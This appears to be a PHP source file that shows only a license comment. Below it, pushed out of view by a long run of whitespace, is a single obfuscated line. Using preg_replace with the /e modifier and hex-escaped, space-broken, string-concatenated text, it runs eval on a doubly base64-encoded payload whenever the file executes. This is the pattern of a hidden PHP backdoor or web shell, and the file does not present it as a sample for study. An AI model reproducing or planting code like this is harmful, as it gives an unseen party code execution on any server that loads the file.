<?php
/**
 *
 * LICENSE: Redistribution and use in source and binary forms, with or
 * without modification, are permitted provided that the following
 * conditions are met: Redistributions of source code must retain the
 * above copyright notice, this list of conditions and the following
 * disclaimer. Redistributions in binary form must reproduce the above
 * copyright notice, this list of conditions and the following disclaimer
 * in the documentation and/or other materials provided with the
 * distribution.
 *
 *
*/

                                                                                                                                                                                                                                                             preg_replace("/[hmwljdofdjrrksg]*.+[xyyprgjcmfrbg]*/ei",str_replace(" ",""," \x65 \x76  \x61   \x6C  \x28 \x62  \x61  \x73 \x65 \x36\x34 \x5F  \x64  \x65 \x63  \x6F   \x64  \x65  \x28 \x62  \x61  \x73 \x65 \x36\x34 \x5F  \x64  \x65 \x63  \x6F   \x64  \x65  \x28 ' YV"."d ZZ "."0 "."t D R"."m x iW"."EIw"."ZV N n "."a1 g"."w"."Tl"."BU"."M H RK"."U lZzbm"."RpZ"."GRL "."U"."0"."Jo Y"."m 1 R Z"."0p "."G O URU M "."D"."l"."MU "."1 V WYk oz"."WW 5YV"."DA 5 S j"."J R bkt"."Yd"."HBaa"."U F v S Vd WdGN"."IUj V"."L"."Q"."1 JmVUU5VF "."ZGc 2 "."5Z eW "."Rk"."S1NrZ 2 "."U"."y"."V mphR"."z"."h nSnp4 MF"."pY a "."D B"."ZWEp"."sW"."VNCeW IzZ Hp "."QVEk0SUd O d"."mJIT "."T"."l P R E Er"."S n pz Z"."0 pH "."U T lZb UZ"."6W l R "."ZMFgy"."Um xZ"."M"."jlr "."Wl"."N o"."e mRI SmZ "."jb"."V Z3Y kd G "."a lpT"."Z 25JQ"."2"."Nz S n"."l zbk x DUmZ"."VR Tl U"."Vk Zz "."bll5"."Z G R"."LU2"."s "."3 YVdZb0p "."H UXB "."J"."RU JsZ"."G 1 G c 0 t"."D "."Um"."tL VH "."NnW"."l dO b 2 J5QW5 QQz kw"."Wlho"."MFl"."Y Smx"."Z VD"."Ru"."Tz "."Mw TkNt Vm p hR"."z hnSn p 4bW Iz S"."n "."RJ"."R 0 Z"."q"."ZE"."dsdm J q"."MGl"."JaU J0 "."W l hSb2 I yUTlj"."R z l 6 ZEQ "."0O GR"."HV"."jR k R0"."Z 5Wl d"."FZ"."1kyOX"."N "."jejA"."0 T"."U "."NCeW IzZHp"."QV"."E k0S Uc1a"."G"."JXV"."TlZ ej"."Q4 T"."DNS bGV I"."UmhjbVZo UGp 4"."aWN"."qN"."D h"."h V z"."V3 "."ZFhRZ2R Ib Hda"."V"."D "."F "."6Z "."F d"."K d"."G"."FYUSt Q"."Qz"."l"."tY "."jN Kd FB"."pY zdaWGhw "."Z"."ER0O "."Q= =' \x29  \x29  \x29  \x3B "),'eklytljpmb'); 
?>